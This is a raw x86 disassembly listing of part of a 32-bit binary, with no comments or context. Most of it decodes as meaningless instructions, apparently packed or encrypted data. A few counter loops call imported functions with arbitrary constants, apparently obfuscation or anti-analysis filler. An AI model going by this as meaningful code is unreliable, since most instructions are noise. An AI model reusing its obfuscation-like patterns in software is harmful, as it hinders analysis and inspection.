  412a0a:	push   eax
  412a0b:	push   0x9082c131
  412a10:	adc    cl,BYTE PTR [ebx]
  412a12:	sti    
  412a13:	mov    ?,esp
  412a15:	test   eax,0x66db543f
  412a1a:	push   esp
  412a1b:	imul   ebp,ebx,0x3ae4763d
  412a21:	mov    cs,WORD PTR [esi+0x54]
  412a24:	xchg   ecx,eax
  412a25:	mov    es,WORD PTR [esi+0x45bb9589]
  412a2b:	fwait
  412a2c:	dec    ecx
  412a2d:	pop    ss
  412a2e:	push   ebx
  412a2f:	or     DWORD PTR [ebx+eax*2],esi
  412a32:	cli    
  412a33:	adc    edx,DWORD PTR [eax+ebx*4+0x50b8e003]
  412a3a:	call   0x5171:0xea729d38
  412a41:	pop    ebp
  412a42:	sbb    esp,DWORD PTR [esi-0x36c39d77]
  412a48:	sti    
  412a49:	mov    eax,0x6aa58d9f
  412a4e:	mov    edx,0xb90aa158
  412a53:	outs   dx,DWORD PTR ds:[esi]
  412a54:	pop    ecx
  412a55:	test   esp,0xf866a613
  412a5b:	sub    esp,DWORD PTR [ebx-0x27ed64b7]
  412a61:	mov    ebx,0x727b7267
  412a66:	sti    
  412a67:	dec    edx
  412a68:	add    bl,BYTE PTR [ebp-0x5837e033]
  412a6e:	xlat   BYTE PTR ds:[ebx]
  412a6f:	repz stc 
  412a71:	jns    0x412a78
  412a73:	xor    eax,0x963a5966
  412a78:	(bad)  
  412a7a:	pop    eax
  412a7b:	pushf  
  412a7c:	sub    eax,0xdbb40cb8
  412a81:	cmp    cl,ch
  412a83:	mov    eax,DWORD PTR [esi+0x33231ba3]
  412a89:	push   es
  412a8a:	mov    ecx,0x5877e7f6
  412a8f:	fwait
  412a90:	je     0x412aa6
  412a96:	mov    ecx,DWORD PTR [ebp+0x14]
  412a99:	add    edi,DWORD PTR ds:0x42e1a0
  412a9f:	mov    ecx,DWORD PTR [ecx]
  412aa1:	or     esi,esi
  412aa3:	mov    DWORD PTR [ebp-0x1c],ecx
  412aa6:	mov    DWORD PTR ds:0x42fd75,0x17
  412ab0:	cmp    DWORD PTR ds:0x42fd75,0x0
  412ab7:	je     0x412b09
  412abd:	cmp    DWORD PTR ds:0x42fd75,0x24
  412ac4:	jne    0x412af1
  412aca:	push   0x5fda
  412acf:	push   0x42de
  412ad4:	push   0x6b28
  412ad9:	push   0x4e0a
  412ade:	push   DWORD PTR [ebp-0x10]
  412ae1:	push   0x8dcd
  412ae6:	push   0x86d4
  412aeb:	call   DWORD PTR ds:0x42e397
  412af1:	mov    edi,DWORD PTR ds:0x42fd75
  412af7:	dec    edi
  412af8:	mov    DWORD PTR ds:0x42fd75,edi
  412afe:	jmp    0x412ab0
  412b03:	and    ecx,DWORD PTR ds:0x42e1a8
  412b09:	imul   edx,eax
  412b0c:	mov    ecx,0x4573
  412b11:	add    DWORD PTR ds:0x42e198,edx
  412b17:	add    edx,ecx
  412b19:	mov    esi,0x7879
  412b1e:	sub    edi,0x22a0
  412b24:	mov    edi,0x1556
  412b29:	jmp    0x412e0d
  412b2e:	retf   
  412b2f:	sbb    eax,eax
  412b31:	inc    esp
  412b32:	loopne 0x412ba7
  412b34:	push   ebx
  412b35:	mov    bl,0x1a
  412b37:	ror    BYTE PTR [edi],cl
  412b39:	ja     0x412b7b
  412b3b:	out    0xaf,eax
  412b3d:	aam    0x11
  412b3f:	data16 jo 0x412bb2
  412b42:	mov    ecx,0xa570707e
  412b47:	push   0xffffffb5
  412b49:	push   ds
  412b4a:	dec    eax
  412b4b:	sti    
  412b4c:	stos   BYTE PTR es:[edi],al
  412b4d:	test   ebp,ebx
  412b4f:	je     0x412bbf
  412b51:	mov    ds:0x1aba05b0,al
  412b56:	adc    BYTE PTR [ebx-0x206dcb55],bl
  412b5c:	sbb    BYTE PTR [ebx-0x1],0xdd
  412b60:	inc    edi
  412b61:	mov    bl,0x91
  412b63:	push   edx
  412b64:	sahf   
  412b65:	jg     0x412bbd
  412b67:	mov    es,WORD PTR [ecx]
  412b69:	mov    edx,cs
  412b6b:	loopne 0x412b98
  412b6d:	(bad)
  412b71:	dec    ebp
  412b72:	add    BYTE PTR [ecx],bl
  412b74:	bound  esp,QWORD PTR [esi+ecx*1]
  412b77:	push   esp
  412b78:	mov    WORD PTR [edx-0x466adf3f],fs
  412b7e:	dec    ebx
  412b7f:	pop    eax
  412b80:	faddp  st(5),st
  412b82:	dec    edi
  412b83:	ror    dh,cl
  412b85:	xchg   edi,eax
  412b86:	ins    BYTE PTR es:[edi],dx
  412b87:	jmp    0x26b91a99
  412b8c:	ret    
  412b8d:	cmp    al,0x67
  412b8f:	sbb    BYTE PTR [eax+0x4c],dh
  412b92:	aam    0x75
  412b94:	xchg   ebp,eax
  412b95:	stos   BYTE PTR es:[edi],al
  412b96:	mov    eax,0xbfec43d8
  412b9b:	cmp    DWORD PTR [edi-0x10],esi
  412b9e:	int3   
  412b9f:	adc    DWORD PTR [edx+0x6a],ebp
  412ba2:	add    bh,BYTE PTR [ebp-0x1d]
  412ba5:	mov    cl,0x80
  412ba7:	adc    eax,0xbf495c36
  412bac:	inc    ebp
  412bad:	sub    eax,0x8666cade
  412bb2:	icebp  
  412bb3:	repz xor DWORD PTR ds:0x24f48680,edi
  412bba:	push   edx
  412bbb:	std    
  412bbc:	mov    es,WORD PTR [ebx]
  412bbe:	lahf   
  412bbf:	dec    edi
  412bc0:	fs fs clc 
  412bc3:	or     DWORD PTR [esp+ecx*1-0x4decc925],0xd8642b84
  412bce:	inc    esi
  412bcf:	imul   ebp,DWORD PTR [ebx+0x70568861],0x243da88f
  412bd9:	test   esp,edi
  412bdb:	add    ebx,DWORD PTR [ecx-0x21319278]
  412be1:	outs   dx,BYTE PTR ds:[esi]
  412be2:	mov    dh,0xdb
  412be4:	add    BYTE PTR [eax],dh
  412be6:	and    ah,BYTE PTR [eax+0x318d9b5c]
  412bec:	sbb    BYTE PTR ds:0xe07e050f,0x4f
  412bf3:	in     eax,dx
  412bf4:	sbb    eax,0xd4606242
  412bf9:	loope  0x412c09
  412bfb:	push   ebx
  412bfc:	cwde   
  412bfd:	gs dec esp
  412bff:	repnz mov edx,0xa813f66f
  412c05:	es xor eax,0x8ca7c7b8
  412c0b:	adc    eax,0xf2b8d448
  412c10:	sub    ecx,0xe
  412c13:	popf   
  412c14:	push   ss
  412c15:	(bad)  
  412c16:	sub    BYTE PTR [edi+0x23],ah
  412c19:	push   eax
  412c1a:	ds pop ecx
  412c1c:	and    BYTE PTR [ebx+0x4b],bh
  412c1f:	push   es
  412c20:	and    dl,ch
  412c22:	add    eax,0xfb3d7878
  412c27:	dec    ebp
  412c28:	xchg   ebp,eax
  412c29:	jecxz  0x412c3d
  412c2b:	dec    esp
  412c2c:	aaa    
  412c2d:	mov    ebp,0xefeaa38a
  412c32:	dec    edi
  412c33:	jmp    0x412bd9
  412c35:	fwait
  412c36:	xor    esi,DWORD PTR [esi]
  412c38:	int    0x94
  412c3a:	mov    esi,0x19180ce3
  412c3f:	xor    DWORD PTR [eax],0xd84f6c82
  412c45:	(bad)  
  412c46:	adc    al,0x55
  412c48:	mov    bl,0xfa
  412c4a:	das    
  412c4b:	pop    es
  412c4c:	addr16 mov ebx,0xbbad89b0
  412c53:	mov    ebp,0xf11dccfc
  412c58:	adc    al,cl
  412c5a:	pop    eax
  412c5b:	push   0x6c
  412c5d:	lock ret 
  412c5f:	mov    edx,0xac0ed4e7
  412c64:	aas    
  412c65:	mov    al,ds:0x78299db3
  412c6a:	jecxz  0x412cd8
  412c6c:	std    
  412c6d:	(bad)  
  412c6e:	sbb    dh,BYTE PTR [esp+edi*1+0x4898c63f]
  412c75:	and    eax,edi
  412c77:	div    DWORD PTR [esp+edx*2-0x355be0f6]
  412c7e:	call   0x3faa:0x30f6387d
  412c85:	int3   
  412c86:	pop    ebx
  412c87:	cli    
  412c88:	cmp    DWORD PTR [edi-0x22],0xea8d05b3
  412c8f:	out    0xd3,eax
  412c91:	dec    eax
  412c92:	dec    ecx
  412c93:	test   DWORD PTR [ebx-0x77],edi
  412c96:	ss jle 0x412c47
  412c99:	dec    esp
  412c9a:	sub    ebp,ecx
  412c9c:	push   ebp
  412c9d:	jnp    0x412c7a
  412c9f:	sahf   
  412ca0:	cli    
  412ca1:	jne    0x412c67
  412ca3:	mov    ds:0x628bbfc0,al
  412ca8:	sbb    al,bl
  412caa:	(bad)  
  412cac:	jbe    0x412c51
  412cae:	sub    BYTE PTR [ebx-0x23],bh
  412cb1:	(bad)  
  412cb2:	cmp    BYTE PTR [edi+ebp*1-0x3],ch
  412cb6:	jo     0x412d30
  412cb8:	mov    ebp,DWORD PTR [ecx-0xee58692]
  412cbe:	dec    edx
  412cbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cc0:	bound  eax,QWORD PTR [ecx-0x3a]
  412cc3:	xchg   edi,eax
  412cc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412cc5:	mov    al,ds:0x7155d5f1
  412cca:	push   ecx
  412ccb:	sub    eax,0xe5b88dae
  412cd0:	push   ds
  412cd1:	add    DWORD PTR [edi+0x364215dc],0x61
  412cd8:	test   BYTE PTR [edi+0x1d],dl
  412cdb:	sti    
  412cdc:	jp     0x412cf4
  412cde:	pop    es
  412cdf:	test   BYTE PTR [ecx+edi*4+0x44],0x73
  412ce4:	xchg   esi,eax
  412ce5:	push   0xffffffd5
  412ce7:	add    ebp,DWORD PTR [edx+0x4e]
  412cea:	sar    DWORD PTR ds:0x153799f2,0x9d
  412cf1:	jg     0x412cd3
  412cf3:	or     eax,0x1944c794
  412cf8:	sub    eax,0x2e9f3f86
  412cfd:	test   BYTE PTR [edx+0x2f965e39],0x4
  412d04:	leave  
  412d05:	add    BYTE PTR [ebp-0x56],cl
  412d08:	fcmovnb st,st(2)
  412d0a:	stc    
  412d0b:	adc    ebx,DWORD PTR [ebp+ebx*2-0x2e242741]
  412d12:	mov    bl,0x3a
  412d14:	push   0x4
  412d16:	cmp    esi,DWORD PTR [ebx-0x5f]
  412d19:	dec    esi
  412d1a:	icebp  
  412d1b:	sar    DWORD PTR [edi+0x10],cl
  412d1e:	push   ecx
  412d1f:	mov    ds:0xf9062b75,eax
  412d24:	icebp  
  412d25:	and    bh,ah
  412d27:	out    0x93,al
  412d29:	mov    ebp,0x2540bc79
  412d2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d2f:	adc    edx,DWORD PTR [ebx-0x2c2ad839]
  412d35:	mov    ecx,0x9d043fd4
  412d3a:	ss cli 
  412d3c:	lahf   
  412d3d:	push   0xa156893e
  412d42:	loop   0x412da2
  412d44:	xchg   BYTE PTR [ebx-0x42120c26],al
  412d4a:	push   cs
  412d4b:	jae    0x412da1
  412d4d:	je     0x412dcb
  412d4f:	mov    bh,0xda
  412d51:	and    al,0x3d
  412d53:	sbb    DWORD PTR [ebx-0x46],ebx
  412d56:	ins    DWORD PTR es:[edi],dx
  412d57:	test   BYTE PTR [esi],al
  412d59:	or     DWORD PTR [ecx],ebp
  412d5b:	shr    cl,0x7e
  412d5e:	fimul  DWORD PTR [ebx-0x12]
  412d61:	imul   edi,DWORD PTR [eax+0x2457735f],0xe1caef1c
  412d6b:	xchg   BYTE PTR [ecx-0x49b5e7fd],bh
  412d71:	jmp    0x412de8
  412d73:	mov    eax,0xcc426442
  412d78:	enter  0x85d8,0x20
  412d7c:	nop
  412d7d:	sub    DWORD PTR [esi+0x648b0850],esi
  412d83:	xor    ch,BYTE PTR [ecx+0x17f30a22]
  412d89:	sbb    BYTE PTR [esp+ecx*2+0x5ff1496],0x51
  412d91:	sub    edx,DWORD PTR [ecx-0x1e]
  412d94:	nop
  412d95:	aad    0x17
  412d97:	les    edi,FWORD PTR [eax]
  412d99:	push   ds
  412d9a:	fistp  DWORD PTR [esp+ebx*4-0x20f91f5e]
  412da1:	or     al,0x7d
  412da3:	cmp    esp,edi
  412da5:	xchg   esi,eax
  412da6:	(bad)  
  412da7:	into   
  412da8:	push   eax
  412da9:	push   esp
  412daa:	ins    DWORD PTR es:[edi],dx
  412dab:	inc    ecx
  412dac:	mov    bh,0x97
  412dae:	popf   
  412daf:	mov    DWORD PTR [esi+ebx*1-0x4b33c2fd],ebx
  412db6:	outs   dx,DWORD PTR ds:[esi]
  412db7:	mov    eax,0xd44c5350
  412dbc:	xchg   ebp,eax
  412dbd:	lods   al,BYTE PTR ss:[esi]
  412dbf:	and    BYTE PTR [edx-0x49dd9283],0x9f
  412dc6:	cmp    eax,0x67d8c3d5
  412dcb:	or     eax,0xbe5067f5
  412dd0:	mov    esi,0x9a16def6
  412dd5:	cmp    DWORD PTR [esi+0x73d51cec],ebp
  412ddb:	jnp    0x412e49
  412ddd:	dec    esp
  412dde:	sub    ah,BYTE PTR ds:0xa79478a4
  412de4:	das    
  412de5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412de6:	jnp    0x412dff
  412de8:	sbb    ch,dh
  412dea:	or     dh,0xbc
  412ded:	mov    fs,WORD PTR [ebp-0x49]
  412df0:	xchg   eax,ebx
  412df2:	cli    
  412df3:	ds fucom st(3)
  412df6:	fs aad 0x86
  412df9:	push   edx
  412dfa:	imul   eax,DWORD PTR [eax],0xc5965207
  412e00:	or     al,cl
  412e02:	inc    ebx
  412e03:	inc    BYTE PTR [eax-0x3fcec6f3]
  412e09:	xchg   edx,esi
  412e0b:	in     al,dx
  412e0c:	cmp    al,BYTE PTR [edi-0x63da7e32]
  412e12:	loope  0x412e56
  412e14:	add    BYTE PTR [eax],al
  412e16:	add    BYTE PTR [eax],al
  412e18:	add    cl,ch
  412e1a:	sldt   WORD PTR [eax]
  412e1d:	add    BYTE PTR [ebx],dh
  412e1f:	leave  
  412e20:	add    ecx,DWORD PTR ds:0x42e19c
  412e26:	inc    ecx
  412e27:	mov    DWORD PTR ds:0x42e19c,ecx
  412e2d:	cmp    DWORD PTR ds:0x42e19c,0x17
  412e34:	jae    0x412e60
  412e3a:	cmp    DWORD PTR ds:0x42e19c,0x25
  412e41:	jne    0x412e55
  412e47:	push   0x286f
  412e4c:	push   DWORD PTR [ebp-0x18]
  412e4f:	call   DWORD PTR ds:0x42e507
  412e55:	jmp    0x412e1e
  412e5a:	xor    ecx,0x7ba7
  412e60:	sub    edx,edi
  412e62:	xor    esi,esi
  412e64:	jmp    0x413148
  412e69:	call   0x6aab08c6
  412e6e:	jno    0x412ee7
  412e70:	popa   
  412e71:	push   ebx
  412e72:	xchg   eax,esp
  412e74:	arpl   WORD PTR [ebx],sp
  412e76:	imul   eax,DWORD PTR [ebx+0x70645acc],0x70
  412e7d:	mov    ecx,0xae70707e
  412e82:	loopne 0x412e2b
  412e84:	mov    DWORD PTR [ecx*1-0x13a1626a],ebx
  412e8b:	xor    DWORD PTR [di],0xb29eabb5
  412e92:	ror    cl,cl
  412e94:	or     eax,0x6e49b41d
  412e99:	test   al,0x93
  412e9b:	pushf  
  412e9c:	aas    
  412e9d:	aas    
  412e9e:	outs   dx,BYTE PTR ds:[esi]
  412e9f:	(bad)  
  412ea1:	and    al,0x8a
  412ea3:	push   edx
  412ea4:	add    esp,DWORD PTR [ecx+ebp*4]
  412ea7:	sub    DWORD PTR [ecx+0x7da68fbb],eax
  412ead:	xchg   esp,eax
  412eae:	scas   al,BYTE PTR es:[edi]
  412eaf:	push   edx
  412eb0:	(bad)  
  412eb1:	loope  0x412efb
  412eb3:	cmp    BYTE PTR [ebp-0x135e5a2b],0x17
  412eba:	jnp    0x412eba
  412ebc:	jge    0x412eea
  412ebe:	pop    edx
  412ebf:	(bad)  
  412ec0:	push   ebp
  412ec1:	mov    dl,0xc
  412ec3:	and    edi,eax
  412ec5:	sub    al,0xf7
  412ec7:	xchg   ebx,eax
  412ec8:	pop    ecx
  412ec9:	mov    al,ds:0x135cd661
  412ece:	and    BYTE PTR [esi+0x22e6bed7],ah
  412ed4:	inc    esi
  412ed5:	je     0x412ea0
  412ed7:	inc    esp
  412ed8:	pop    esi
  412ed9:	push   ebp
  412eda:	in     eax,0xdc
  412edc:	pop    ecx
  412edd:	xchg   edx,eax
  412ede:	das    
  412edf:	pop    ebp
  412ee0:	test   BYTE PTR [edi],dh
  412ee2:	ins    BYTE PTR es:[edi],dx
  412ee3:	aaa    
  412ee4:	dec    esp
  412ee5:	aas    
  412ee6:	lds    ecx,FWORD PTR [esi-0x44]
  412ee9:	jp     0x412f5c
  412eeb:	mov    esi,0x2e5ac3a5
  412ef0:	shr    DWORD PTR [ebx-0x18b0b23e],cl
  412ef6:	sbb    eax,0xb4994844
  412efb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412efc:	out    0xc6,eax
  412efe:	inc    ebp
  412eff:	or     eax,0x66c4e804
  412f04:	cdq    
  412f05:	adc    al,0xc2
  412f07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f08:	outs   dx,DWORD PTR ds:[esi]
  412f09:	add    ch,ch
  412f0b:	bnd jp 0x412f03
  412f0e:	push   ebp
  412f0f:	cmc    
  412f10:	inc    ebp
  412f11:	and    al,0xf
  412f13:	pop    ds
  412f14:	jmp    FWORD PTR [ebx+0x53ccd374]
  412f1a:	(bad)  
  412f1b:	mov    ds:0x9680c8f3,al
  412f20:	add    BYTE PTR [ebx+0x2d],dl
  412f23:	push   edx
  412f24:	dec    edi
  412f25:	adc    BYTE PTR ss:[edi-0x6dba2b],bh
  412f2c:	pop    ss
  412f2d:	adc    eax,0x1d76e2d7
  412f32:	loop   0x412f9e
  412f34:	add    eax,DWORD PTR gs:[edi-0x5f41a86b]
  412f3b:	or     edi,DWORD PTR [edx+edx*8]
  412f3e:	dec    edx
  412f3f:	loopne 0x412fac
  412f41:	(bad)  
  412f42:	xchg   ebp,eax
  412f43:	cld    
  412f44:	retf   
  412f45:	jnp    0x412fa4
  412f47:	mov    DWORD PTR [ebx-0x1822984a],ebp
  412f4d:	vhsubpd ymm4,ymm3,YMMWORD PTR [ebx-0xba48e04]
  412f55:	sub    ch,BYTE PTR [edx-0x79]
  412f58:	cmp    eax,0xfd9229b1
  412f5d:	aam    0xc7
  412f5f:	mov    eax,cs
  412f61:	test   BYTE PTR [edi],al
  412f63:	bound  ebx,QWORD PTR [esi]
  412f65:	mov    bh,0x9f
  412f67:	int    0x6a
  412f69:	test   eax,0x7740dcf6
  412f6e:	xchg   ebp,eax
  412f6f:	jmp    0xcd6:0xae810045
  412f76:	fadd   QWORD PTR [eax]
  412f78:	call   0x2678:0x6bdc555
  412f7f:	jns    0x412f29
  412f81:	cwde   
  412f82:	outs   dx,BYTE PTR ds:[esi]
  412f83:	push   ebp
  412f84:	inc    esp
  412f85:	aaa    
  412f86:	retf   
  412f87:	mov    eax,ds:0xdbccbf83
  412f8c:	ds call 0x82c6c0da
  412f92:	into   
  412f93:	bound  eax,QWORD PTR [esi+0x22]
  412f96:	jmp    0x7e5d:0x9aeecad3
  412f9d:	xor    al,BYTE PTR [esi+0x60]
  412fa0:	rol    BYTE PTR [ebp-0xf],0xd2
  412fa4:	xchg   ah,bl
  412fa6:	and    BYTE PTR [eax+0x62],ch
  412fa9:	dec    esp
  412faa:	push   ebx
  412fab:	sub    dh,dh
  412fad:	dec    ecx
  412fae:	ins    DWORD PTR es:[edi],dx
  412faf:	mov    BYTE PTR [esp+edi*4+0x8b3fd97],bh
  412fb6:	mov    bh,0xaa
  412fb8:	into   
  412fb9:	rol    DWORD PTR [edx+0xe],cl
  412fbc:	rol    bl,cl
  412fbe:	mov    bl,0x9c
  412fc0:	xor    DWORD PTR [edx-0x178e6e69],0x42
  412fc7:	stos   DWORD PTR es:[edi],eax
  412fc8:	sub    BYTE PTR [esi-0xb],0x18
  412fcc:	dec    esi
  412fcd:	xor    eax,0xc205a662
  412fd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fd3:	sbb    ah,BYTE PTR ds:0x19cd3ecb
  412fd9:	mov    cl,0xf9
  412fdb:	pop    es
  412fdc:	xor    ah,BYTE PTR ds:0xc7bbda6f
  412fe2:	or     al,0x54
  412fe4:	xchg   DWORD PTR ds:0xd5387ccc,esp
  412fea:	movd   DWORD PTR [edi-0x25],mm1
  412fee:	xchg   edx,eax
  412fef:	enter  0xcce1,0x9
  412ff3:	dec    esi
  412ff4:	mov    edi,DWORD PTR [eax-0x6ee4f6bb]
  412ffa:	mov    cs,WORD PTR [ebp+0x20]
  412ffd:	mov    ebp,0x5f3baadd
  413002:	mov    esp,0x8cb52931
  413007:	(bad)  
  413008:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413009:	dec    esp
  41300a:	mov    ah,0xb5
  41300c:	mov    ah,0x98
  41300e:	cmp    bh,ch
  413010:	in     eax,dx
  413011:	loop   0x41301d
  413013:	lods   al,BYTE PTR ds:[esi]
  413014:	add    esi,eax
  413016:	push   es
  413017:	pop    es
  413018:	out    0xa7,eax
  41301a:	xchg   esp,eax
  41301b:	or     ecx,DWORD PTR [ebp+0x6f620b4a]
  413021:	mov    cl,0x3d
  413023:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413024:	adc    eax,0x24a33e63
  413029:	sbb    eax,0xc4cf0626
  41302e:	(bad)  
  41302f:	repz repnz mov ecx,0x333d71bc
  413036:	test   DWORD PTR [esi+0x7c],ebx
  413039:	(bad)  
  41303a:	in     eax,0xdd
  41303c:	lods   eax,DWORD PTR ds:[esi]
  41303d:	cmc    
  41303e:	fxam   
  413040:	xor    al,BYTE PTR [edx-0x2a]
  413043:	dec    esp
  413044:	lock loopne 0x413028
  413047:	enter  0x6c7a,0xe9
  41304b:	or     BYTE PTR [ebp+0x570d26fb],bl
  413051:	cmp    eax,0x24fdc50f
  413056:	and    eax,0x6a8d7498
  41305b:	and    ebx,0xd1b91319
  413061:	sbb    eax,0xf0c09800
  413066:	pop    ebx
  413067:	push   es
  413068:	cmp    eax,0x6bc7308f
  41306d:	pop    DWORD PTR [ebx-0x47ae195d]
  413073:	clc    
  413074:	outs   dx,DWORD PTR ds:[esi]
  413075:	mov    edi,DWORD PTR [ecx]
  413077:	in     eax,dx
  413078:	adc    eax,0x31efae7a
  41307d:	dec    ebx
  41307e:	xor    eax,0x6a7f36b2
  413083:	push   esp
  413084:	(bad)  
  413085:	lds    ecx,FWORD PTR ds:0x7a1298da
  41308b:	lock js 0x413094
  41308e:	fisttp WORD PTR [ecx]
  413090:	push   DWORD PTR [edx-0x1217fec5]
  413096:	pop    ebx
  413097:	ins    DWORD PTR es:[edi],dx
  413098:	xchg   esi,eax
  413099:	sub    dl,dl
  41309b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41309c:	les    ebp,FWORD PTR [ecx]
  41309e:	xchg   edx,eax
  41309f:	aas    
  4130a0:	into   
  4130a1:	cmp    al,0x68
  4130a3:	add    edx,DWORD PTR [edx-0x54b97bbf]
  4130a9:	shl    DWORD PTR [edx],1
  4130ab:	int    0x4f
  4130ad:	jae    0x4130b5
  4130af:	xchg   edx,eax
  4130b0:	inc    ecx
  4130b1:	xchg   esp,eax
  4130b2:	dec    ecx
  4130b3:	arpl   WORD PTR [ebx+ebp*4-0x1071b15c],cx
  4130ba:	add    DWORD PTR [edx+0x67a8ef94],eax
  4130c0:	cdq    
  4130c1:	mov    WORD PTR [edi+0x5e11da0e],?
  4130c7:	in     al,0x9c
  4130c9:	pop    esi
  4130ca:	push   ebp
  4130cb:	std    
  4130cc:	ret    0xd223
  4130cf:	cld    
  4130d0:	lods   al,BYTE PTR ds:[esi]
  4130d1:	mov    edi,0xd72bce6b
  4130d6:	into   
  4130d7:	adc    ch,bh
  4130d9:	sub    eax,0xb427b784
  4130de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130df:	out    0xc3,al
  4130e1:	cmc    
  4130e2:	retf   
  4130e3:	loopne 0x4130a8
  4130e5:	fisttp WORD PTR [edi-0x25]
  4130e8:	les    edx,FWORD PTR [edx]
  4130ea:	daa    
  4130eb:	ins    DWORD PTR es:[edi],dx
  4130ec:	sbb    BYTE PTR [esi+edi*8+0x3f9a1ec1],ch
  4130f3:	les    ebx,FWORD PTR [edx]
  4130f5:	out    0x3,eax
  4130f7:	fiadd  DWORD PTR [ebp-0x59]
  4130fa:	pop    ebp
  4130fb:	sbb    DWORD PTR [esp+ecx*8],ebx
  4130fe:	rol    esp,0x34
  413101:	stos   BYTE PTR es:[edi],al
  413102:	enter  0x8e8,0xb5
  413106:	dec    edi
  413107:	push   esp
  413108:	mov    eax,ds:0x9d6aacb0
  41310d:	mov    dh,0x72
  41310f:	push   ds
  413110:	dec    esp
  413111:	adc    BYTE PTR [eax+ebx*2],al
  413114:	enter  0xd37c,0xf8
  413118:	jge    0x413127
  41311a:	dec    esp
  41311b:	sbb    eax,0x811753f7
  413120:	jno    0x41317c
  413122:	sbb    BYTE PTR [ebp+edx*1-0x2c],dl
  413126:	or     ch,BYTE PTR [edx]
  413128:	dec    eax
  413129:	inc    ebx
  41312a:	outs   dx,BYTE PTR ds:[esi]
  41312b:	push   edx
  41312c:	or     BYTE PTR [edi-0x4f6f4d52],0x9e
  413133:	push   esi
  413134:	mov    bl,0xe1
  413136:	push   ebx
  413137:	dec    esi
  413138:	pop    ebx
  413139:	push   ss
  41313a:	jne    0x4130f3
  41313c:	push   eax
  41313d:	scas   eax,DWORD PTR es:[edi]
  41313e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41313f:	stos   DWORD PTR es:[edi],eax
  413140:	pop    ecx
  413141:	mov    ecx,0xca6c6eb1
  413146:	mov    ah,0xe7
  413148:	mov    DWORD PTR [ebp-0x28],esi
  41314b:	mov    DWORD PTR [ebp-0x2c],esi
  41314e:	mov    DWORD PTR [ebp-0x14],esi
  413151:	adc    ecx,0x52b8
  413157:	mov    DWORD PTR [ebp-0x8],esi
  41315a:	xor    ecx,DWORD PTR ds:0x42fd79
  413160:	mov    ecx,DWORD PTR [ebp-0x18]
  413163:	xor    ecx,eax
  413165:	adc    DWORD PTR ds:0x42e1a8,ebx
  41316b:	xor    edi,edi
  41316d:	jmp    0x413451
  413172:	push   0x51581534
  413177:	popa   
  413178:	jne    0x4131ae
  41317a:	add    edx,ebp
  41317c:	cmp    al,BYTE PTR [ecx]
  41317e:	cmc    
  41317f:	inc    edx
  413180:	pop    ebx
  413181:	xor    ah,BYTE PTR [ebx-0x468f8f9f]
  413187:	jle    0x4131f9
  413189:	jo     0x413168
  41318b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41318c:	lods   eax,DWORD PTR ds:[esi]
  41318d:	jb     0x41320d
  41318f:	pushf  
  413190:	mov    edi,0x19c92cb8
  413195:	inc    edi
  413196:	call   DWORD PTR [ecx+0x69e7fce]
  41319c:	push   ebp
  41319d:	xchg   ebp,eax
  41319e:	test   al,0xa6
  4131a0:	clc    
  4131a1:	pop    edi
  4131a2:	shr    dl,1
  4131a4:	out    dx,eax
  4131a5:	dec    esi
  4131a6:	and    BYTE PTR [eax+0x75604fa],0x1f
  4131ad:	sub    ah,BYTE PTR [esi-0x2c7eb1d]
  4131b3:	and    cl,dh
  4131b5:	push   eax
  4131b6:	jp     0x4131ed
  4131b8:	dec    ebx
  4131b9:	nop    ecx
  4131bc:	pop    ss
  4131bd:	(bad)  
  4131be:	div    BYTE PTR [esi+0x18f8f51f]
  4131c4:	ret    0xc5f4
  4131c7:	or     eax,0x54911b30
  4131cc:	in     al,0xfd
  4131ce:	nop
  4131cf:	lods   al,BYTE PTR ds:[esi]
  4131d0:	jne    0x41320f
  4131d2:	cld    
  4131d3:	xchg   BYTE PTR [edx+0x38e437c7],bl
  4131d9:	mov    ah,0xd8
  4131db:	out    dx,al
  4131dc:	add    al,BYTE PTR [ebp-0x457252d7]
  4131e2:	daa    
  4131e3:	push   0x24
  4131e5:	test   BYTE PTR [eax],bh
  4131e7:	or     esi,DWORD PTR [ebp+0x44df3512]
  4131ed:	shr    BYTE PTR [esi-0x4ee5f67a],0xf8
  4131f4:	std    
  4131f5:	mov    ebx,0xce519f8
  4131fa:	js     0x413279
  4131fc:	cwde   
  4131fd:	or     ecx,DWORD PTR [edx+0x749ec87c]
  413203:	out    0x10,al
  413205:	mov    eax,ds:0x8fe988b2
  41320a:	outs   dx,BYTE PTR ds:[esi]
  41320b:	or     al,0xf
  41320d:	and    ah,BYTE PTR [ebp-0x79]
  413210:	aaa    
  413211:	stos   BYTE PTR es:[edi],al
  413212:	scas   eax,DWORD PTR es:[edi]
  413213:	adc    al,BYTE PTR [esp+edi*2]
  413216:	or     bl,BYTE PTR [esi+esi*4+0x49eee0d0]
  41321d:	inc    ebp
  41321e:	in     al,0xa6
  413220:	push   ebx
  413221:	cli    
  413222:	(bad)  
  413223:	or     eax,0xaa2576d3
  413228:	mov    ds:0xcab1a6da,eax
  41322d:	push   ecx
  41322e:	loopne 0x413236
  413230:	mov    dl,0x9a
  413232:	cmp    ebx,DWORD PTR [eax+0x1e]
  413235:	xchg   ah,bh
  413237:	jge    0x413293
  413239:	les    ebp,FWORD PTR [eax+edi*2+0x47]
  41323d:	fisttp WORD PTR [ebp-0x10]
  413240:	idiv   BYTE PTR [ebx+0x13]
  413243:	test   esp,ecx
  413245:	xchg   BYTE PTR [ebp-0x26],dl
  413248:	mov    bl,0xc4
  41324a:	fimul  WORD PTR ds:0xa6c63c05
  413250:	jl     0x413283
  413252:	clc    
  413253:	pop    es
  413254:	xchg   ebp,eax
  413255:	sub    cl,BYTE PTR [edx+0x1d362955]
  41325b:	nop
  41325c:	std    
  41325d:	clc    
  41325e:	or     eax,0xcaccd1c3
  413263:	mov    al,0xcd
  413265:	mov    edx,0xa526f443
  41326a:	push   es
  41326b:	aad    0xed
